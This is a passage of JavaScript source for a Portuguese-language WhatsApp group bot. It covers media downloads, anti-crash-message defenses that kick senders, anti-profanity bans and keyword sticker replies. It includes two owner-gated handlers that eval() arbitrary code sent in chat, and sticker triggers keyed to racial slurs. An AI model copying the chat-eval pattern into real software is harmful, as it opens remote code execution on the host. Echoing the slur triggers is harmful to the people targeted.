nezuko.sendMessage(from, {audio: videokk, mimetype: 'audio/mp4', fileName: `${buffer.resultado.título}.m4a`}, {quoted:dnselo}).catch(e => {
console.log(e)
reply("ERRO!")
})
break

case 'shorts_video': 
teks = args.join(" ");
if (!teks) return enviar(`Cadê o link?`)
if (isUrl(teks[0]) && !teks[0].includes('youtube.com/shorts/')) return reply("Link precisa ser do YouTube Shorts!")
reply(enviar.espere)
buffer = await fetchJson(`https://nezsab-apis.xyz/api/ytmp4-2?url=${teks}&apikey=${keyapi}`)
videokk = await getBuffer(buffer.resultado.link)
nezuko.sendMessage(from, {video: videokk, mimetype: 'video/mp4', fileName: `${buffer.resultado.título}.mp3`}, {quoted:dnselo}).catch(e => {
console.log(e)
reply("ERRO!")
})
break

//========FINAL DAS PESQUISAS=============


default:

//========================================

if(isBotGroupAdmins && isAntiCtt && type === 'contactMessage') {
if(isGroupAdmins) return nezuko.sendMessage(from, {text: 'Contato detectado, você é adm, então não irei ti remover'}, {quoted: dnselo})
await nezuko.sendMessage(from, {text: 'opa fechado pelo bot detectado trava contato ou vcard, caso for um engano, fale com algum adm.'}, {quoted: dnselo})
await nezuko.groupSettingUpdate(from, 'announcement')
await sleep(2000);
Kic = `${sender.split("@")[0]}@s.whatsapp.net`
nezuko.groupParticipantsUpdate(from, [sender], 'remove')
await sleep(2000);
await nezuko.sendMessage(from, { text: 'o grupo sera limpado para evitar fazer efeito da trava'}, {quoted: dnselo})
await sleep(3000);
clear = `🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅`
nezuko.sendMessage(from, {text: clear}, {quoted: dnselo, contextInfo : { forwardingScore: 500, isForwarded:true}})
await sleep(3000);
await nezuko.sendMessage(from, { text: 'agora enviarei destrava aguarde '}, {quoted: dnselo})
await sleep(2000);
await nezuko.sendMessage(from, {text: destrava(prefix)}, {quoted: dnselo})
await sleep(2000);
await nezuko.sendMessage(from, {text: destrava(prefix)}, {quoted: dnselo})
await sleep(2000);
await nezuko.sendMessage(from, { text: 'reporte ao adm o ocorrido '}, {quoted: dnselo})
await sleep(5000);
await nezuko.groupSettingUpdate(from, 'not_announcement')
await sleep(2000);
await nezuko.sendMessage(from, { text: 'Aberto nao marque a trava ou levara ban✅'}, {quoted:dnselo})
}

if(isBotGroupAdmins && isAntiCtt && type === 'contactsArrayMessage') {
if(isGroupAdmins) return nezuko.sendMessage(from, {text: 'Contato detectado, você é adm, então não irei ti remover'}, {quoted: dnselo})
await nezuko.sendMessage(from, {text: 'opa fechado pelo bot detectado trava contatos'}, {quoted: dnselo})
await nezuko.groupSettingUpdate(from, 'announcement')
await sleep(2000);
Kic = `${sender.split("@")[0]}@s.whatsapp.net`
nezuko.groupParticipantsUpdate(from, [sender], 'remove')
await sleep(2000);
await nezuko.sendMessage(from, { text: 'o grupo sera limpado para evitar fazer efeito da trava'}, {quoted: dnselo})
await sleep(3000);
clear = `🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅`
nezuko.sendMessage(from, {text: clear}, {quoted: dnselo, contextInfo : { forwardingScore: 500, isForwarded:true}})
await sleep(3000);
await nezuko.sendMessage(from, { text: 'agora enviarei destrava aguarde '}, {quoted:dnselo})
await sleep(2000);
await nezuko.sendMessage(from, {text: destrava(prefix)}, {quoted: dnselo})
await sleep(2000);
await nezuko.sendMessage(from, {text: destrava(prefix)}, {quoted: dnselo})
await sleep(2000);
await nezuko.sendMessage(from, { text: 'reporte ao adm o ocorrido '}, {quoted:dnselo})
await sleep(5000);
await nezuko.groupSettingUpdate(from, 'not_announcement')
await sleep(2000);
await nezuko.sendMessage(from, { text: 'Aberto nao marque a trava ou levara ban✅'}, {quoted: dnselo})
}

if(isBotGroupAdmins && Antiloc && type === 'locationMessage') {
if(isGroupAdmins) return nezuko.sendMessage(from, {text: 'Localização detectada, você é adm, então não irei ti remover'}, {quoted: dnselo})
await nezuko.sendMessage(from, {text: 'opa fechado pelo bot, detectado trava Localização ou localização comum, caso for um engano, fale com algum adm.'}, {quoted: dnselo})
await nezuko.groupSettingUpdate(from, 'announcement')
await sleep(2000);
Kic = `${sender.split("@")[0]}@s.whatsapp.net`
nezuko.groupParticipantsUpdate(from, [sender], 'remove')
await sleep(2000);
await nezuko.sendMessage(from, { text: 'o grupo sera limpado para evitar fazer efeito da trava'}, {quoted: dnselo})
await sleep(3000);
clear = `🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅`
nezuko.sendMessage(from, {text: clear}, {quoted: dnselo, contextInfo : { forwardingScore: 500, isForwarded:true}})
await sleep(3000);
await nezuko.sendMessage(from, { text: 'agora enviarei destrava aguarde '}, {quoted:dnselo})
await sleep(2000);
await nezuko.sendMessage(from, {text: destrava(prefix)}, {quoted: dnselo})
await sleep(2000);
await nezuko.sendMessage(from, {text: destrava(prefix)}, {quoted: dnselo})
await sleep(2000);
await nezuko.sendMessage(from, { text: 'reporte ao adm o ocorrido '}, {quoted:dnselo})
await sleep(5000);
await nezuko.groupSettingUpdate(from, 'not_announcement')
await sleep(2000);
await nezuko.sendMessage(from, { text: 'Aberto não marque a trava ou levará ban✅'}, {quoted: dnselo})
}

if(isBotGroupAdmins && isAnticatalogo && type === 'productMessage') {
if(isGroupAdmins) return nezuko.sendMessage(from, {text: 'Catalogo detectado, você é adm, então não irei ti remover'}, {quoted: dnselo})
await nezuko.sendMessage(from, {text: 'opa fechado pelo bot, detectado trava Catalogo ou Catalogo comum, caso for um engano, fale com algum adm.'}, {quoted: dnselo})
await nezuko.groupSettingUpdate(from, 'announcement')
await sleep(2000);
Kic = `${sender.split("@")[0]}@s.whatsapp.net`
nezuko.groupParticipantsUpdate(from, [sender], 'remove')
await sleep(2000);
await nezuko.sendMessage(from, { text: 'o grupo sera limpado para evitar fazer efeito da trava'}, {quoted:dnselo})
await sleep(3000);
clear = `🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅`
nezuko.sendMessage(from, {text: clear}, {quoted: dnselo, contextInfo : { forwardingScore: 500, isForwarded:true}})
await sleep(3000);
await nezuko.sendMessage(from, { text: 'agora enviarei destrava aguarde '}, {quoted:dnselo})
await sleep(2000);
await nezuko.sendMessage(from, {text: destrava(prefix)}, {quoted: dnselo})
await sleep(2000);
await nezuko.sendMessage(from, {text: destrava(prefix)}, {quoted: dnselo})
await sleep(2000);
await nezuko.sendMessage(from, { text: 'reporte ao adm o ocorrido '}, {quoted:dnselo})
await sleep(5000);
await nezuko.groupSettingUpdate(from, 'not_announcement')
await sleep(2000);
await nezuko.sendMessage(from, { text: 'Aberto nao marque a trava ou levara ban✅'}, {quoted:dnselo})
}

if (body.length >= limitefl) { 
if(!isAntiFlood) return
if(isAntiFlood && isGroupAdmins && isBotGroupAdmins && isPremium) {
if(isBot) return 
reply('*Link detectado, porém usuário é admin*')
} else {
if(SoDono) return
if(isGroupAdmins) return
if(isPremium) return
var Kic = `${sender.split("@")[0]}@s.whatsapp.net`  
setTimeout( () => {
if(!SoDono  && !m.key.fromMe && !isGroupAdmins) return reply('Muitas características enviadas, eu afirmo que pode ser trava, por precauções, eu irei remover.')
console.log(color('deram Spam','red'))
}, 100)
setTimeout( () => {
nezuko.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
setTimeout( () => {
}, 0)
}
}

//========================================

hora2 = moment.tz('America/Sao_Paulo').format('HH:mm:ss');


/*
if (isCmd) {
uptime = process.uptime()  
sendBtext(from, `
╭┅═┅═┅═┅═┅═┅═┅═᳀
┃❖╭─────────────➤
┃❖│
┃❖│ HORA: ${hora2}
┃❖│ᬊ͜͡ ❓ O COMANDO: ${prefix}${command} 
┃❖│ᬊ͜͡ ⁉️ NÃO EXISTE
┃❖│USE: ${prefix}menu
┃❖│
┃❖╰─────────────
╰┅═┅═┅═┅═┅═┅═┅═᳀➤`, `TEMPO DO BOT ATIVO:\n ${kyun(uptime)}`,[{buttonId: `${prefix}menu`, buttonText: {displayText: `[🌹️] OK NEZUKO MOSTRA TEU MENU [🌹️] `}, type: 1}], m) 
}
*/

if (isCmd) {
r = (Date.now() / 1000) - info.messageTimestamp
uptime = process.uptime()
 sections = [
    {
	title: " 𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿 ",
	rows: [
{title: "[🦅️] 𝐌𝐄𝐍𝐔 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐎 [🦅️]", rowId: `${prefix}menu`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂"},
{title: "[🥃️] 𝐌𝐄𝐍𝐔 𝐃𝐎𝐍𝐎 [🚬️]", rowId: `${prefix}menudono`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂"},
{title: "[👥️] 𝐈𝐍𝐅𝐎 𝐃𝐎𝐍𝐎 [👥]", rowId: `${prefix}infodono`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂"},
{title: "[⚙️] 𝐃𝐎𝐍𝐎 [⚙️]", rowId: `${prefix}dono`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂"},
{title: "[💪] 𝐏𝐈𝐍𝐆 [🐎]", rowId: `${prefix}ping2`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂"},
{title: "[💸️] 𝐑𝐄𝐃𝐄𝐒 [💸️]", rowId: `${prefix}redes`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂"}
	]
    },
]
 
 

const listMessage2 = {
  text: `┏⧐┅⃟┅┅⧏ ❀ ⧐┅┅⃟┅⧏┓
╎│⋟ 『 𝐂𝐌𝐃 𝐍𝐀̃𝐎 𝐑𝐄𝐆𝐈𝐒𝐓𝐑𝐀𝐃𝐎 』
╎│⋟ ${pushname} 
╎│⋟ 𝐂𝐥𝐢𝐪𝐮𝐞 𝐧𝐨 𝐛𝐨𝐭𝐚̃𝐨 𝐚𝐛𝐚𝐢𝐱𝐨
╎│⋟ © 𝐂𝐨𝐩𝐲𝐫𝐢𝐠𝐡𝐭 𝐛𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂    
┗⧐┅⃟┅┅⧏ ❀ ⧐┅┅⃟┅⧏┛
  `,
  title: ``,
  buttonText: `<❗> 𝐥𝐢𝐬𝐭𝐚 𝐦𝐞𝐧𝐮 <❗>` , 
  sections
}
nezuko.sendMessage(from, listMessage2, {quoted: dnselo})
}
//========================================


if(isCmd) {
if(command == "play" ||
command == "play2" ||
command == "ytmp3" ||
command == "gtts" ||
command == "yta" ||
command == "play3") {
nezuko.sendPresenceUpdate('recording', from)
} else nezuko.sendPresenceUpdate('composing', from)
}


//=====================================

switch(ants){
} 

//=========[--ANTI PALAVRÃO--]==========\\
if (isGroup && isPalavrao) { //CREDITOS DANIEL 
 if (palavra.includes(budy2)) {
 if (!isGroupAdmins) {
 nezuko.sendMessage(from, {text: `SEM PALAVRÃO!! 😠!!`}, {quoted : dnselo})       
setTimeout( () => {
nezuko.groupParticipantsUpdate(from, [sender], 'remove')
}, 2000)
reply("2")
setTimeout( () => {
reply("1")
}, 1000)
setTimeout( () => {
nezuko.sendMessage(from, {text: `「 🗣️ANTI PALAVRÃO🗣️ 」*\nVocê será banido do gp, Na proxima tenha ética ao falar!!`}, {quoted : m}).catch(e => {
nezuko.sendMessage(from, {text: `InFelizmente, não sou um administrador, entt não posso te banir!!`}, {quoted : m})
})       			
}, 0)
} else {
return reply(`VOCÊ PODE ${pushname} 😇`)
}
}
}

 
//================(SIMIH-2)=================\\

if (!isCmd && isSimi2 && isGroup) {
if(isCmd || isUrl(budy2)) return
if(budy.length >= 500) return 
if(budy.includes("@55")) return
if (info.key.fromMe) return
if (type == 'extendedTextMessage' && prefix.includes(info.message.extendedTextMessage.contextInfo.quotedMessage.conversation[0])) return
insert(type, info)
const sami = await response(budy)
console.log(sami)

if (sami) nezuko.sendMessage(from, {text: sami, thumbnail: logo}, {quoted: info});
}


 //===============(SIMIH-1)===============\\
    
if (isGroup && isSimi && bady != undefined) {
if(type == 'imageMessage') return 
if(type == 'audioMessage') return 
if(type == 'stickerMessage') return   
if(info.key.fromMe) return 
console.log(bady)
muehe = await simih(bady)
console.log(muehe)
reply(muehe)
}


//========================================\\


if (body.startsWith('>')) {
    if (!SoDono) return 
    try {
let evaled = await eval(body.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
    } catch (err) {
await reply(`erro`)
    }
}


//=====================================


           
           
  //=====================================
  
             if (budy.match(`Bot fecha o gp`)) {
if (!SoDono) return reply(`${mess.owner}`)
reply('Ok mestre')
nezuko.groupSettingUpdate(m.chat, 'announcement').then
			
	}  
                                   
                                   
  //=====================================
  
                                     
if (budy.match(`Nezuko limpa o chat ai`)) {
	if (!isGroup) throw `comando bloqueado🚫 \nentre no grupo para usá-lo:\n\nhttps://chat.whatsapp.com/DTsrSH5CVF66Xvn9Ow61Yn`
               if (!isBotAdmins) throw `preciso ser adm primeiro`
                          let buttonse = [
                    {buttonId: `@null`, buttonText: {displayText: 'obrigado por limpar meu chat Nezuko >3'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`,
                    footer: `SEU CHAT FOI LIMPO PELA 𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿`,
                    buttons: buttonse,
                    headerType: 2
                }
                nezuko.sendMessage(m.chat, buttonMessagee)
}                                                                                                           
  //=====================================
  
               if (budy.match(`Bot abre o gp`)) {
if (!SoDono) return reply(`${mess.owner}`)
reply('Ok mestre')
nezuko.groupSettingUpdate(m.chat, 'not_announcement').then
			
	}                                                            
  //=====================================                                
  if (budy.match(`@5521964523665`)) {
 if (mek.key.fromMe) return 
var zeltas =['jájá ele vai ver sua msg','pare de marcar meu dono🖐😐','só tô vendo vc marcar meu criador','pare de marcar doido','já já ele aparece, enquanto isso vai um café?☕️','aguarde que logo logo ele estará aqui']
var zalts = zeltas[Math.floor(Math.random() * zeltas.length)]
var badin =['1','2','3','@5521964523665']
var oto = badin[Math.floor(Math.random() * badin.length)]
reply(`${zalts}`);
nezuko.sendMessage(m.chat, {sticker: fs.readFileSync(`./funções de cmd/imgs/menções/3.webp`)}, {quoted: m});
 }                                                              
//=============== =============\\

 
//=============================\\
            
            if (budy.match(`Ban`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/banido.webp')}, {quoted: m});
            }
            
            if (budy.match(`Gay`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/gay.webp')}, {quoted: m});
            }
            
                        if (budy.match(`Pix`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/pix.webp')}, {quoted: m});
            }
            
                       if (budy.match(`Fdp`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/fdp.webp')}, {quoted: m});
            }
            
                        if (budy.match(`Arrombado`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/fdp.webp')}, {quoted: m});
            }
            
                        if (budy.match(`Makako`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/fdp.webp')}, {quoted: m});
            }
            
                        if (budy.match(`Macaco`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/fdp.webp')}, {quoted: m});
            }
            
                       if (budy.match(`Noia`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/fdp.webp')}, {quoted: m});
            }
            
                        if (budy.match(`Bot gay`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/botgay.webp')}, {quoted: m});
            }
                     
                        if (budy.match(`Bot chato`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/botgay.webp')}, {quoted: m});
            }
            
                        if (budy.match(`Mama`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/mama.webp')}, {quoted: m});
            }
            
            
                        if (budy.match(`Matuê`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/matue.webp')}, {quoted: m});
            }
            
                        if (budy.match(`Festa`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/festa.webp')}, {quoted: m});
            }
            
                        if (budy.match(`Festinha`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/festa.webp')}, {quoted: m});
            }
            
                        if (budy.match(`Não gostei`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/naogostei.webp')}, {quoted: m});
            }
            
                        if (budy.match(`Gostei`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/naogostei.webp')}, {quoted: m});
            }
            
                       if (budy.match(`Oi Nezuko`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/oi.webp')}, {quoted: m});
            }
           
            
                       if (budy.match(`Boa tarde nezuko`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/boa tarde.webp')}, {quoted: m});
            }
            
                        if (budy.match(`Boa noite nezuko`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/boa noite.webp')}, {quoted: m});
            }
            
                        if (budy.match(`Vai se fude nezuko`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/fdp.webp')}, {quoted: m});
            }
            
                        if (budy.match(`Elon musk`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/gosar.webp')}, {quoted: m});
            }
            
                       if (budy.match(`Em pleno 2022`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/2022.webp')}, {quoted: m});
            }
            
                       if (budy.match(`Bot ruim`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/ruim.webp')}, {quoted: m});
            }
            
            if (budy.match(`negao`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/figu60.webp')}, {quoted: m});
            }
            
            if (budy.match(`real`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/figu44.webp')}, {quoted: m});
            }
            
            if (budy.match(`xandao`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/figu12.webp')}, {quoted: m});
            }
            
            if (budy.match(`oi bot`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/17.webp')}, {quoted: m});
            }
            
            if (budy.match(`stutis`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/47.webp')}, {quoted: m});
            }
            
            if (budy.match(`te amo`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/61.webp')}, {quoted: m});
            }
            
            if (budy.match(`pato`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/figu9.webp')}, {quoted: m});
            }
            
            if (budy.match(`cabeleleiro`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/figu11.webp')}, {quoted: m});
            }
            
            if (budy.match(`fake`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/figu45.webp')}, {quoted: m});
            }
            
            if (budy.match(`flamengo`)) {
nezuko.sendMessage(from, {sticker: fs.readFileSync('./sticker/figu14.webp')}, {quoted: m});
            }
                                        
            
//======================================\\

if (budy.includes("apagar") || (budy.includes("Apagar") || (budy.includes("apaga") || (budy.includes("apagar") || (budy.includes("Apaga")))) )){
if (!SoDono) return
if (!quoted) return
let { chat, fromMe, id } = quoted
nezuko.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
}

//=====================================

if(budy.includes("Qual prefixo") || budy.includes("qual e seu prefixo") || budy.includes("nezuko seu prefixo") || budy.includes("Prefix")) { 
await  
reply(`ᴀϙᴜɪ ᴇsᴛᴀ́ sᴇᴜ ᴘʀᴇғɪxᴏ:『 ${prefix} 』`)
}

//=====================================

if (body.startsWith('>')) {
donoprincipal = '5521964523665@s.whatsapp.net'
if (!donoprincipal.includes(sender) && !info.key.fromMe) return
if(budy.includes("keyapi")) return reply("fofinho, você hein😏")
try {
console.log('[', color('EVAL', 'silver'),']', color(moment(info.messageTimestamp * 1000).format('DD/MM HH:mm:ss'), 'yellow'), color(budy))
return reply(JSON.stringify(eval(budy.slice(2)),null,'\t')) 
} catch (e) {
reply(e)
}
}

//=====================================


}
} catch (e) {
if(String(e).includes("rate-overlimit")) {
console.log(color("Ignore esta mensagem..", "gray"))
} else if(String(e).includes("at async groupMetadata")) {
console.log(color("Ignore esta mensagem..", "gray"))  
} else if(String(e).includes("Session error")) {
console.log(color("Ignore esta mensagem..", "gray"))
} else if(String(e).includes("rate-overlimit")) {
console.log(color("Ignore esta mensagem..", "gray"))
} else if(String(e).includes("Bad MAC Error")){
console.log(color("Ignore esta mensagem..", "gray"))
} else if(String(e).includes("Key used already or never")) {
console.log(color("Ignore esta mensagem..", "gray"))
} else {
console.log(color(`${e}`, "red"))  
}
}
 


}

